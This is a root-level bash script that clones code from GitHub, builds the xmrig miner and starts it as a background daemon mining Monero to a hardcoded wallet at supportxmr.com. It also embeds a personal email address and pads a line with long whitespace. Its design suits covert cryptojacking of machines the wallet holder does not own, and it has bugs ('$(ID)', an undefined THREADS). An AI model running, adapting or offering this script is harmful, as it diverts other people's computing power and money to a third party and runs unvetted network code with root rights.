#! /bin/bash
if [ "$(whoami)" != "root" ];																																																										 then																																																																																																																																																					
        echo -e "\033[0;31mSorry, you are not root. Please use sudo option\033[0m"
        exit 1
fi
WALLET=85N7CN9ePcn2eE85WDBsxX2buYBaYsw7U4hbER7P2Xzg23m7x5CvYX3Dk8er478j939xrfyUHQuWLWazGuEWc4vYGSARFPm
ID="$(hostname)"
MAIL=robbertopp@gmail.com
PASSWORD=$ID:$MAIL

echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
echo -e '\033[0;32m##### Installing updates and install soft...\033[0m'
sudo apt-get update && sudo apt-get install -y git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake screen htop nano mc gcc-7 g++-7 
sleep 2
cd /usr/local/src
git clone https://github.com/loaman123/miner-xmr.git miner
git clone https://github.com/xmrig/xmrig.git
cd /usr/local/src/xmrig ; mkdir build && cd build
cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7 -DWITH_HTTPD=OFF && make
cp xmrig /usr/local/bin
sleep 1
#xmrig -c /tmp/miner/config.json
#xmrig -o pool.supportxmr.com:5555 -u $WALLET --pass=$PASSWORD --rig-id="$(ID)" --threads=$THREADS -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10																																																																																										
xmrig -B -S --donate-level 1 --cpu-priority 3 -o pool.supportxmr.com:5555 -u $WALLET -p "$PASSWORD" --rig-id="$(ID)" -k
echo -e '\033[0;32m##### Miner started \033[0m'
echo -e '\033[0;32m##### Watch: \033[0m'
echo -e '\033[0;32m##### journalctl -t xmrig \033[0m'
